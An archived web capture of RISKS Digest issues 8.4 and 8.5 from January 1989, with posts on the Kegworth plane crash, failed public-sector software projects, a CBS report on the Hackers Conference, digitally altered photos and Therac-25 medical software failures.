<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.04.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-54</DOCNO>
<DOCOLDNO>IA012-000131-B036-365</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.4.html 128.240.150.127 19970217024820 text/html 21471
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:46:50 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 4</TITLE>
<LINK REL="Prev" HREF="/Risks/8.03.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.05.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.03.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.05.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 4</H1>
<H2> Wednesday 11 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  M1 Plane crash 
</A>
<DD>
<A HREF="#subj1.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  $4.5 M Child Support Computer to be Scrapped in VA 
</A>
<DD>
<A HREF="#subj2.1">
Dave Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Eelskin wallets erase mag strips? 
</A>
<DD>
<A HREF="#subj3.1">
Jane D. Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Firearms Arrive in the Electronics Age 
</A>
<DD>
<A HREF="#subj4.1">
Allen
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Unused city computer system set aside after 4 years, $4M 
</A>
<DD>
<A HREF="#subj5.1">
Stephen W. Thompson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Hackers' Conference versus CBS 
</A>
<DD>
<A HREF="#subj6.1">
John Gilmore
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
M1 Plane crash
</A>
</H3>
<address>
Nigel
&lt;<A HREF="mailto:roberts%untadh.DEC@decwrl.dec.com ">
roberts%untadh.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Wed, 11 Jan 89 03:02:40 PST
</i><PRE>

"DISASTER BECOMES A MATTER OF ROUTINE

There is no pattern to the proliferation of disasters. Lockerbie was a 
bomb on a middle-aged jet, blown to pieces high over a Scottish town.
Flight BD-92 was a spanking new jet which somehow (inevitable speculation)
seems to have contrived to lose both engines limping in to land at 
Castle Donington. No suggestion of a bomb, though the flight was Belfast-
bound; and --- compared to the carnage of Lockerbie --- enormous strokes of
good fortune. You cannot, surveying the debris strewn across the M1 (freeway),
quite visualise how so many passengers survived, nor calcualte the odds
against the doomed Boeing ploughing into a string of cars and lorries;
nor those against fire engulfing the scene.

In a way, the horror of BD-92, like Clapham Junction, like King's Cross
even, is easier to come to terms with. It was justone of those things: 
mechanical (or, possibly, human error.) Inquiries may be conducted, 
reports published. There are things that can be done. Engines to be checked.
Software to be scrutinised. Training to be tightened. And, beyond such 
simple reactions, of course, there will be more political questions. 
How rigorous and independent are Civil Aviation Authority checks? Do 
they take too much for granted, because the FAA has already pronounced
an aircraft safe? Have all the lessons of Manchester been learned and
acted upon? What are the risks for two engined planes? We have been
constantly informaed that the chances of both engines failing are 
millions to one, so that such airliners now cross the Atlantic as a
matter of routine. But the odds may have shortened somewhat over 
Kegworth on Sunday night.

There is a broader sense, though, in which the M1 disaster brings no
comfort at all. It was a failure of technology; or maybe some element
of human incapacity to deal with technology. There is supposed reassurance
in hi-tech. The machines take over, to blind-land a jumbo, or put man
into space. Eliminate human error. Leave it to the computers. But that
is too blithe. Week after week, month after month, hi-tech planes
fall out of the sky. Because they are military jets, and fall usually
into the sea or on some deserted hillside, they do not command the 
headlines. (Though when, as a few weeks ago, they plough into the centre
of a West German town, all that changes). They are not safer because of
their extreme sophistication; on the contrary, they are dangerous because
human beings, no matter how relentlessly trained, are not sophisticated
enough to command their infinite complexity. And so, in civil aviation too,
the new, replacing the middle aged, does not automatically spell greater safety.

We must, in short, begin to budget for disaster. Watch the jets stacked 
over Heathrow or Gatwick and there is a feeling of living dangerously, of
disasters waiting to happen. As they occur, they will not necessarily
alter the basic calculations. It will still, statistically, be safer to 
take a flight to New York, than your car for a Sunday spin. The growth
in air traffic cannot be checked; nor can the demand for new, more
complex planes. There is, here, a sense of challenge. Airports within 
a few hundred yards of motorways; jets wheeling to land over cities.
Lockerbie and Castle Donington are very different cases, united only
by their fear and pity. The odds against them happening with a handful
of days, like the odds against two engines failing, were millions to
one. But disaster, it seems, has a way of rendering odds meaningless."

	--- 'The View from Britain', leader article in _The Guardian_
	     newspaper, Tuesday January 10 1989

    [Several of this evening's news programs report the possibility of a
    computer problem or cross-wiring error that might imply it was not
    pilot error...  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
$4.5 M Child Support Computer to be Scrapped in VA
</A>
</H3>
<address>
dave davis 
&lt;<A HREF="mailto:davis@community-chest.mitre.org">
davis@community-chest.mitre.org
</A>&gt;
</address>
<i>
Wed, 11 Jan 89 07:54:07 -0500
</i><PRE>

From the 24 Dec 88 issue of the Washington Post comes an article about yet
another failed software development project. 

The system was to disburse child support payments for the State Dept. of
Social Services...The state paid $4.5 M for the system in 1985...  problems
with the system caused delays up to six months in issuing payments...

The state is now seeking a completely new system [now that it has figured
out its requirements, apparently] for $10M, to be installed in two years.

The article further states: "the state bought Unisys' proposed package outside
of normal competive bidding practices, a move a state auditors' report later
found was made in an 'atmosphere of panic and haste'...welfare officials never
checked to see if the system would do what the company promised."

It appears that the state officials involved didn't exercize the kind of
management care that a more routine non-technical procurement would have
received.

Dave Davis, McLean, VA

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
eelskin wallets erase mag strips?
</A>
</H3>
<address>
Jane D. Smith
&lt;<A HREF="mailto:jds@uncecs.edu ">
jds@uncecs.edu 
</A>&gt;
</address>
<i>
10 Jan 89 15:44:03 GMT
</i><PRE>

From a report on NPR's All Things Considered program 1/9/89:

A spokesperson for a distributor of eelskin wallets responded to the apparently
widespreading rumor [SEE <A HREF="/Risks/6.25.html">RISKS-6.25</A>] that eelskin wallets erase the magnetic
strip information on credit cards and ATM cards of their owners. Sales of
eelskin wallets have dropped as wary consumers boycott the alleged mag strip
eaters. The magnets used as closures for the wallets are the real culprits,
however, and the spokesperson said the manufacturers were now using smaller
magnets as closures or using conventional snap closures. Caveat emptor! 
-- Jane Dunlap Smith UNC-ECS Information Services

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Firearms Arrive in the Electronics Age
</A>
</H3>
<address>
&lt;<A HREF="mailto:ALLEN@s56.prime.com">
ALLEN@s56.prime.com
</A>&gt;
</address>
<i>
10 Jan 89 11:30:27 EST
</i><PRE>

This item appeared in Business Week Nov 28, 1988:

                                Electronic Gun

  Colt industries Inc has filed for US and European patents on a handgun with
  an electronic firing system.  Pulling the trigger would move a magnet past
  the solid state switch, triggering a circuit that releases the hammer.  It
  would be more reliable and cheaper than mechanical systems, says the company.
  In addition, putting chips in pistols would make it possible to add a digital
  display that warns when the gun is loaded and shows how many shots are left.
  And that could just be the beginning of new "user friendly" features for
  tomorrow's firearms.

Now, I'm not a "hardware type" (maybe they're thinking of microcoding the gun
:-)?), but after reading recent RISKS articles that discuss such things as
electromagnetic interference with army helicopters, etc., it seems that the
risks attendant with the device described above should be prohibitive.  This
firearm design seems just plain absurd!

Other points: whatever happened to the tried-and-true engineering philosophy
of "simplest best"?  An electronic firing system in a handgun seems, say,
Rube Goldberg-ish, yes?  Furthermore, with your little digital display, all
the excitement of playing Russian Roulette would disappear.

 ------------------------------

Date: Mon, 09 Jan 89 15:07:47 -0500
From: "Stephen W. Thompson" &lt;thompson@a1.quaker.upenn.edu&gt;
Subject: Unused city computer system set aside after 4 years, $4 million
Organization: Institute for Research on Higher Education, Univ. of Pennsylvania

The following article comes from the 6 January 1989 (Friday) Philadelphia
Inquirer, front page.  In this city where the government is widely criticized
on every front, it raises questions of incompetence and poor management.  It
also, however, raises questions about whether cities out to be involved in
software development.

   Unused city computer system set aside after 4 years, $4 million
   By Dan Meyers, Inquirer Staff Writer

   After at least $4 million in expenses and more than four years of
frustration, the City of Philadelphia has shelved a computer system it bought
-- but never used.  Officials in the Finance Department had pitched the system
in the early 1980s as an efficient way to track information on payroll,
pensions and personnel.
   "Has it worked?" City Councilman John F. Street asked at a hearing this
week.
   "No it has not," said Deputy Finance Director Peter A. Certo, the latest
supervisor of the project.  Certo said the total cost has been at least $4
million.  Street put it at $5 million.  The system now is in storage.
   For the current fiscal year, which began in July, the Finance
Department had budgeted more than $400,000 for a 13-member team to work
on the computer system.

* In May, however, with Mayor [Wilson] Goode facing a $79 million budget
deficit and calling for a cut of 2,000 people in the city workforce, Finance
director Betsy C. Reveal decided to put the program on hold indefinitely.  She
did not respond to requests for comment.
   "We didn't really scrap it," said Certo.  "We put it on the back burner."
   Records in the city controller's office show the project was scuttled by
mid-September.  The failure of the system was mentioned Wednesday in a hearing
on another matter of the Appropriations Committee, which Street chairs.
"Council members really though we'd been burned" on the Finance Department
project, Street said.

* [Overall problems with city funding finally brought the computer
system's development to a halt.]

   The computer tapes, programs and consultant reports have been put in storage
and could be "resurrected" when the city can afford to pursue them, Certo said.
Certo said the problem was that it was difficult to adapt a computer system to
the myriad peculiarities of the city.  And he said it would have taken
additional staff and money to get the computer system working.  According to
Certo, the project was underfunded from the start.  When it was mothballed, the
computer program was at least six months away from working, Certo said.
   Others were skeptical of the ability of such departments as Finance to
oversee complicated computer projects.  "Systems like this are difficult to
install and should be left to professionals to do," said Eugene L. Cliett Jr.,
director of the Philadelphia Computing Center, an office created by Goode to
oversee city computer projects.
   The computer project was under discussion at least as early as 1982, under
the administration of Mayor William J. Green, according to controller records.
   The plan was to take a software package -- computer programs already
designed by a company -- and modify it to the city's particular needs.  The
city chose not to order a custom-designed computer system because the cost
would have been double or triple, Certo said.
   By early 1984, the city had entered into a $1.4 million contract with
American Management Systems to develop a computer system that would combine, in
easily digestible form, data on city employees.
   "Time is of the essence," the contract said.
   Numerous consulting contracts followed, totalling at least $214,000,
according to controller records.  Much of the rest of the cost was for
city staff assigned to the project.
   The system initially was to include information on three areas --
payroll, pensions and personnel.  All had, and still have, separate
computer systems.  The pension board pulled out of the project shortly
after it began.
   "We have a system now that is 30 years old and it pays people every week but
doesn't give us a lot of management information we'd like to have," Certo said.
The computer system that was supposed to cure that problem was slow in taking
shape, however.  "We spent two years modifying the package and in the course of
that period found things we felt wer not addressed adequately by AMS," Certo
said.  At one point, he said, the list of problems was at least 85 items long.
   AMS consultants began to phase out of the work and the city Finance
Department took it over.  But one department or another objected to the
results, Certo said.  "We were constantly changing things," he recalled.  "We
tried to accommodate everyone."
   Finally, in the city budget crunch, Reveal decided to abandon the
long-standing project, at least for the moment.
   So at a time when the city could most use precise information that
could help the city run more efficiently, the Goode administration has
determined that it cannot afford to pay for it.
   "You're damned if you do and damned if you don't," Certo said.  "We
decided not to do it."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Hackers' Conference versus CBS
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:gnu@toad.com ">
gnu@toad.com 
</A>&gt;
</address>
<i>
Mon, 9 Jan 89 18:13:34 PST
</i><PRE>

I was at the Hackers' Conference whose blatantly slanted news coverage was
recently reported in The Institute and Risks.  I created a transcript of the
CBS news segment the evening it was aired; it is below.  Reading it is
interesting; while CBS never lied, they juxtaposed material from different
sources to make a strong impression that we were criminals.  Note in particular
what was happening on the screen while various things were said (e.g. showing a
"combat" video game while talking about us as revolutionaries, showing Cliff
Stoll giggling about mice and playing with a Yo-Yo).  BTW, there *was* the
obligatory shot of tape drives, I seem to recall.

CBS was given special access in order to film the conference; the rest of the
press was only allowed there on Sunday.  Needless to say they will NOT be
invited back (and I will personally escort them off the property even if they
show up on Sunday).  Unfortunately, that's not enough. The producer of the show
guaranteed that the attendees' image of hacking, rather than the distorted,
media-generated image of hacking, would be presented.  He broke that promise,
with a vengence, but boycotting CBS won't help.  (Fred Peabody produced the
Hackers coverage.  He went to ABC, working on 20/20, according to Glenn Tenney,
who ran the Hackers Conference.  Be sure you don't let him *near* anything you
are doing -- if you want fair and unbiased coverage.)
                                                            John Gilmore

	Transcript of CBS News segment on the Hackers Conference
		filmed 7 Oct 88, aired 8 Oct 88.

Anchorman ("High Technology" logo and drawing of chip):  An unusual
conference is under way near San Francisco.  The people attending it
are experts on a technology that intimidates most of us, but has changed
the way we live.  John Blackstone reports.

Narrator (trees and outdoor scenes at conference):  A small revolutionary
army is meeting in the hills above California's Silicon Valley this
weekend, plotting their next attacks on the valley below, the heart
of the nation's computer industry.  They call themselves computer hackers.

Jonathan Post:  "The people who are gathered here changed the world
once; if we can agree on where to go next, we're gonna change it again."

Narr (conference scenes, blinking lights):  What hackers have learned
to do with computers has changed the world, for both good and bad. 
They're the people who dreamed of and built the personal computer industry.
But the same kind of talent is creating never before dreamed-of crime.
Because for a computer, the only difference between a hundred and a
million is a few zeros.

Donn Parker, (SRI International, in office):  "And so, in fact, criminals
today I think have a new problem to deal with: and that is how much
should I take.  They can take any amount they want."

Narr  (phone central office):  Telephone companies are the most victimized
because those who break into phone company computers can link up for
free to computers around the world.

Richard Fitzmaurice (Pacific Bell, in office):  "You'll hear the term
computer hacker, computer cracker; we call them computer criminals."

Narr (blinking lights):  But much more frightening are the hackers
who crack American military computers.  Earlier this year in a lab that
does some classified research, astronomer Clifford Stoll discovered
someone had broken into his computer.  He says it was like finding a
mouse running across the floor.

Stoll (in office):   "You watch and you see, he's going in that hole
over there, and you say, ooh, he's going in that hole; that connects
to a network that goes to a military computer, in Okinawa."

Narr (Stoll playing with a yo-yo in a machine room):   The breakins
to American military computers went on for several months.  Eventually
Stoll traced them to a hacker in West Germany.

Donn (in office):  "A hacker today is an extremely potentially dangerous
person.  He can do almost anything he wants to do in your computer."

Narr (at conference, video games, stabbing and fighting on screen):  But at
the hackers' camp in the hills, there's recognition that in any
revolutionary army there will be a few rogues and criminals.  But that's no
reason, they say, to slow down the revolution.  

``John Blackstone, CBS News, in the hills above Silicon Valley.''

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.03.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.05.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-55</DOCNO>
<DOCOLDNO>IA012-000131-B036-392</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.5.html 128.240.150.127 19970217024842 text/html 24525
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:47:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 5</TITLE>
<LINK REL="Prev" HREF="/Risks/8.04.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.06.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.04.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.06.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 5</H1>
<H2> Wednesday 11 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Digital Photos and the Authenticity of Information 
</A>
<DD>
<A HREF="#subj1.1">
Dave Robbins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Medical software 
</A>
<DD>
<A HREF="#subj2.1">
Ivars Peterson via Robert Morris
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Digital Photos and the Authenticity of Information
</A>
</H3>
<address>
Dave Robbins 
&lt;<A HREF="mailto:dcr0%uranus@gte.com">
dcr0%uranus@gte.com
</A>&gt;
</address>
<i>
Mon, 9 Jan 89 10:53:43 EST
</i><PRE>

An article in the Boston Globe on January 2, 1989 describes the use of 
digital technology to retouch or drastically alter photographs, with results 
that show no evidence of the fact that alterations were done. The article 
said: "The 80's are fast becoming the last decade in which photos can be 
considered evidence of anything." It pointed out that the only confidence we 
can have in these digital photographs relies upon the ethics of the people 
who use the machines. In response to the question: "What about the ethics of 
all this?" a vendor of the technology is quoted as answering: "That's up to 
you." George Wedding of the Sacramento Bee is quoted as saying: "I hope that 
10 years from now readers will be able to pick up a newspaper and magazine 
and believe what they read and see. Whether we are embarking on a course 
which will make that impossible, I don't know. I'm afraid we have."

This is not the first time I've read about this technology, and every article 
I've read has raised the concern that the new technology renders inoperative 
a very basic assumption made by society (and the law, in particular) since 
the development of photographic technology; namely, that a photograph can be 
considered to be reliable evidence. Until recently, it was virtually 
impossible to alter a photograph without leaving evidence of the alteration; 
physical evidence was available to confirm or deny the authenticity of the 
photo. With digital photos, this is no longer true.

The article reminded me, however, of a more basic concern I have regarding 
the use of computer technology. Computer technology has had the following 
impacts upon record-keeping:

1) The use of electronic storage to eliminate physical storage (e.g., 
paper) of information has certain clear benefits, but has also 
eliminated reliable records of that information, because electronic 
storage media can be altered without leaving any evidence of alteration. 
Electronic records cannot be considered to be as reliable as physical 
records (certainly not today, and perhaps not ever). The best we can do 
is provide a combination of physical security and software controls to 
attempt to assure the reliability of records; and as we all know, 
software controls are not all that reliable and in any case can be 
circumvented, often with the greatest of ease.

2) Computer technology renders the task of altering electronic records 
extremely easy. Forgery has been a problem ever since written records 
were first used. But before computer technology was used to store and 
manipulate records, few people were capable of forging records well 
enough to fool anyone else -- forgery of physical records requires a 
considerable skill, possessed by relatively few people. Successful 
alteration and forgery of electronic records, however, requires 
considerably less skill -- and the skill it does require is usually one 
that a large number of people possess: the ability to use a computer.

3) Computer technology has made it practical to store and manipulate far 
larger volumes of information than could be handled with prior 
technology. We have no practical means of verifying the integrity of 
such large volumes of information, and are thus left with no choice but 
to trust that the electronic records are accurate. It is wholly 
impractical, for example, for the Social Security Administration's 
entire data base (how many hundreds of millions of individual records?) 
to be manually audited to verify its accuracy.

What bothers me is the combination of factors: the electronic storage of the 
information makes it very easy to carry out successful alterations and 
forgeries, and the volume of information makes it practically impossible to 
verify the authenticity of the information. As we put more kinds of 
information under the control of computer technology, it seems to me that we 
make it ever more difficult to trust the authenticity of information. 
Computer technology has the potential (and is in fact beginning to realize 
that potential) to destroy the very important and fundamental concept that 
truth is ascertainable from physical evidence.

Are we approaching the point (or have we reached it already?) where truth is, 
for all practical purposes, whatever the computer says it is? Where what is 
accepted as truth is easily manipulated by those who are privileged to have 
access to the digital keepers of truth?

We observe a bit of this phenomenon in advertising (commercial and 
political), where public perception of truth is subtly manipulated by images 
and propaganda; and to that extent, this is not a phenomenon peculiar to 
computer technology. But most of us are at least aware that advertising is on 
the face of it an attempt to persuade us to believe a certain thing, and thus 
that its appearance of "truth" is not to be taken at face value. We at the 
same time continue to believe that facts are facts, and that there are 
reliable ways to permanently record objective truth.

The computer is depriving us of the ability to authenticate that which is 
purportedly a recording of objective truth. What will the impact be upon 
society when we come to understand that we can no longer trust those forms of 
evidence that we have so long taken for granted to be reliable? When an 
authentic-looking photograph shows something that may or may not have 
actually existed? When an apparently authentic sound recording reproduces 
sounds that may or may not have actually occurred? When a corporation's 
audited and verified financial records describe financial activities that may 
or may not have ever occurred?

Not that these are really new threats: individuals have for a long time 
attempted to falsify all kinds of records. But in times past, it has been so 
difficult to succeed at forgery that we have been confident that a forgery 
could be detected. That confidence leads to the confidence that if a physical 
record passes all authenticity tests, it is indeed a reliable record.

Computer technology has destroyed this confidence. Where are the authenticity 
tests for electronic records? Is it ever possible for us to have the same 
high degree of confidence in electronic records that we have in physical 
records? I understand software too well to suppose that today's software 
technology is capable of supporting really trustworthy verification of the 
authenticity of electronic records, and I'm not convinced that software can 
ever be trustworthy enough to achieve the level of reliability possessed by 
physical records. But does that mean that we shouldn't use computer 
technology to manage information? How do we in the computer industry deal 
with this problem?

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Medical software
</A>
</H3>
<address>
&lt;<A HREF="mailto:RMorris@DOCKMASTER.ARPA">
RMorris@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 10 Jan 89 12:04 EST
</i><PRE>

               A Digital Matter of Life and Death
                        by Ivars Peterson
                   Science News, 12 March 1988

The radiation-therapy machine, a Therac 25 linear accelerator, was designed to
send a penetrating X-ray or electron beam deep into a cancer patient's body to
destroy embedded tumors without injuring skin tissue.  But in three separate
instances in 1985 and 1986, the machine failed.  Instead of delivering a safe
level of radiation, the Therac 25 administered a dose that was more than 100
times larger then the typical treatment dose.  Two patients died and a third
was severely burned.
     The malfunction was caused by an error in the computer program controlling
the machine.  It was a subtle error that no one had picked up during the
extensive testing the machine had undergone.  The error surfaced only when a
technician happened to use a specific, unusual combination of keystrokes to
instruct the machine.
     The Therac incidents and other cases of medical device failures caused by
computer errors have focused attention on the increasingly important role
played by computers in medical applications.  Computers or machines with
built-in microprocessors perform functions that range from keeping track of
patients to diagnosing ailments and providing treatments.
     "The impact of computers on medical care and the medical community is the
most significant factor that we have to face," says Frank E.  Samuel Jr.,
president of the Health Industry Manufacturers Association (HIMA), based in
Washington, D.C.  "Health care will change more dramatically in the next 10
years because of software-driven products than for any other single cause."
Samuel made his remarks as a recent HIMA-sponsored conference on the regulation
of medical software.
     At the same time, reports of medical devices with computer-related
problems are appearing more and more frequently.  In 1985, the Food and Drug
Administration (FDA) reported that recalls of medical devices because of
computer faults had roughly doubled over the previous five years.  Since then,
the number of such complaints has risen further.
     The problems range across a wide spectrum of computer-based medical
devices.  A system designed for monitoring several patients at once was
recalled because it kept mixing up the patients.  A programmable heart
pacemaker suddenly "froze" while it was being adjusted by a doctor.  A device
for dispensing insulin delivered the drug at an inappropriate rate.  An expert
system gave the wrong diagnosis, resulting in a patient receiving a drug
overdose.  An ultrasound scanner sometimes underestimated fetal weight.
     "No one can deny that allowing computers to perform some of the functions
normally carried out by trained and licensed medical professionals raises
questions concerning the personal health and safety of citizens," Michael
Gemignani of the University of Maine in Orono comments in ABACUS (Vol. 5, No.
1).  "But even if we agree something more needs to be done to protect society
in the face of these technological innovations, we are still left with the
question: What should be done and by whom?"
     The FDA, in its mandated role as guardian of public health and safety, is
now preparing to regulate the software component of medical devices.  The
agency's effort has already raised questions about what kinds of products,
software and information systems should be regulated.
     Last fall, the FDA published a draft policy for the regulation of computer
products marked for medical use.  In that policy, the concept of "competent
human intervention" sets the dividing line between what is and is not
regulated.  In other words, the computer product in question is subject to
regulation if a qualified doctor or nurse cannot effectively intervene to
override the machine's actions.  Devices such as software-driven cancer therapy
machines, programmable heart pacemakers and automatic drug dispensers clearly
fall into that category.
     On the other hand, the FDA states that it would not regulate computer
products that simply store, retrieve and disseminate information analogous to
that traditionally provided by textbooks and journals.  In addition, the
agency's regulations would not apply to computer products used only for
communications, general accounting or teaching.
     For example, a physician may use a computer program known as an expert
system to help make a diagnosis.  Because the expert system does not directly
drive another medical device that, say, could dispense a drug when needed, and
because the doctor can make an independent judgment, such an expert system
would be exempt from FDA rules governing medical devices.
     However, the greatest advantage of software - its flexibility - is also,
from a regulatory point of view, one of its biggest problems.  Computer
programs are easy to change and can be used in many different ways.  If
corrections are made or new features added, how much scrutiny should the
modified version of a previously approved computer product undergo?  That
question is still unresolved.
     Furthermore, it's sometimes hard to make a clear distinction between
programs that perform a "library" function and those that can be classified as
being part of a medical device.  A case in point is the patient medical record,
traditionally a file folder containing various sheets of paper listing
treatments, medical observations and other pieces of information vital for the
patient's proper care.
     Many hospitals are now moving toward medical records that are stored on a
computer.  The difficulty arises when such information systems are connected
directly to machines that, for example, record patient blood pressure and heart
rate.  If a nurse takes down the data and then enters the figures into a
computer, the information system software would not be subject to FDA rules.
But if the machine sends the data directly to the computer, then the
information system is considered by the FDA to be an "accessory" to a medical
device and subject the same level of regulation as the machine itself.
     Information system vendors disagree with the FDA's position.  They argue
that the FDA does not presently have rules governing the quality and content of
paper medical records.  There's no reason for the FDA to start regulating such
records, they say, just because the records happen to be in a computer's memory
rather than on paper.  In fact, using a computer-based system would
dramatically reduce the incidence of errors in patient records, the vendors
claim.  The benefits of improved record keeping would clearly outweigh the need
for burdensome regulation.
     The FDA's James S. Benson concedes that "regulation is not the automatic
solution to problems in hospitals and elsewhere."  Nevertheless, the agency
must comply with a 1976 law that contains a broad definition of what
constitutes a medical device.  Interpreted in its broadest sense, the
definition encompasses practically everything used in a hospital, from X-ray
machines to pencils.
     FDA officials say they recognize the difficulties involved in regulating
medical software.  "The agency fully appreciates the revolution occurring in
medicine with the introduction of computers and microprocessors," says Frank E.
Young, FDA commissioner.  "We're taking a reasoned, structured approach with a
minimum of oversight.  We have tried to give general guidelines.  The policy
has been deliberately made flexible."
     The flexibility allows the FDA to consider applications for approval on a
case-by-case basis.  That limits the "chilling fear of undue regulation," says
Young.  Furthermore, as technologies change and experience with computers in
medical applications grows, decisions on how much regulation is needed may also
change.
